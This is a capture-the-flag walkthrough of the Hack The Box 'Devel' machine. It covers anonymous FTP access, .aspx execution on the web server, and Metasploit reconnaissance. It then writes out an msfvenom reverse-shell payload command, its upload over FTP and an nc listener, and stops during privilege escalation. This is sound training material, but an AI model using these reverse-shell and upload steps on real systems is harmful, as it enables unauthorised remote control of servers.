![obraz](https://github.com/Anogota/HTB-Devel/assets/143951834/de0f1e26-120f-4489-a162-9aec23416994)

1.What is the name of the service is running on TCP port 21 on the target machine?
First i need to use nmap, here is the switch i used: nmap -sCV <IP> results:

![obraz](https://github.com/Anogota/HTB-Devel/assets/143951834/5e6337fa-7500-42b1-a02f-9f69688731fb)

That how we see, port 21 is Microsoft ftpd, we also see in this scan that we can login as Anonymous

2.Which basic FTP command can be used to upload a single file onto the server?
We can check this by man ftp.
![obraz](https://github.com/Anogota/HTB-Devel/assets/143951834/242e59e5-15d3-4450-95bf-90b4db1b936b)

3.Are files put into the FTP root available via the webserver?
we can check this simply, first i log in to FTP as Anonymous and list file:
![obraz](https://github.com/Anogota/HTB-Devel/assets/143951834/34dc920d-0449-4ddc-a184-374dc95058a8)

And after this i go to website and view source code, and i find welcome.png, and we can confirm the FTP root available via the webserver 
And the answer for question is "yes"

4.What file extension is executed as a script on this webserver? Don't include the ..
First step i did is a ffuf catalog on webserver, i found something
![obraz](https://github.com/Anogota/HTB-Devel/assets/143951834/764efa13-cff5-4f11-b371-7d016e907104)
I go to google and find something about aspnet_client on hacktricks, the extension

![obraz](https://github.com/Anogota/HTB-Devel/assets/143951834/fac28888-698c-40a5-b65a-e68af49bb78a)

Another step to find extenstion executed is interecept with Burp traffic and there we can find 
![obraz](https://github.com/Anogota/HTB-Devel/assets/143951834/fb28a512-fa26-4afb-9eec-d5d67f259b94)

and also go to google, and there we can find extenstion .aspx

5.Which metasploit reconnaissance module can be used to list possible privilege escalation paths on a compromised system?
first we need turn on metasploit by command: msfconsole -q 
And then write: search suggester

![obraz](https://github.com/Anogota/HTB-Devel/assets/143951834/8d7aecd0-2e17-46e3-9dee-2be5eabea7cc)

6.Submit the flag located on the babis user's desktop.
We know the FTP root available via the webserver, we can create the exploit by msfvenom and upload on the FTP server, here is the command that create the RCE.
└─$ msfvenom -p windows/shell_reverse_tcp -f aspx LHOST=10.10.16.14 LPORT=4444 -o reverse-shell.aspx
And we need to go FTP and login as Anonymous and put this riverse shell by this command:
put reverse-shell.aspx
we can see on the FTP server as exploit.
![obraz](https://github.com/Anogota/HTB-Devel/assets/143951834/eb6f341f-9df1-4732-b35e-92732a334c6f)

And go to website and traffic this name of exploit, and rember you need turn on your nc on port 4444 by this command: nc -lvnp 4444 without this u can't get a RCE.
![obraz](https://github.com/Anogota/HTB-Devel/assets/143951834/a1b808ad-a62e-431e-96e9-c1266ed476d6)
And here is the result:

![obraz](https://github.com/Anogota/HTB-Devel/assets/143951834/93cea7d2-a82e-4eba-8325-59da3e8e140b)

Now we need to find user.txt, because this is a simple CTF this must be in the some user, on Desktop.
But when i try change directory i see some problems on babies and Administrator

![obraz](https://github.com/Anogota/HTB-Devel/assets/143951834/418a02b7-ab76-4f6e-ae93-48d0867fc0d2)

First my step is write systeminfo and find some exploit.

![obraz](https://github.com/Anogota/HTB-Devel/assets/143951834/727bb89e-f152-41f7-80ef-a70a63e46254)
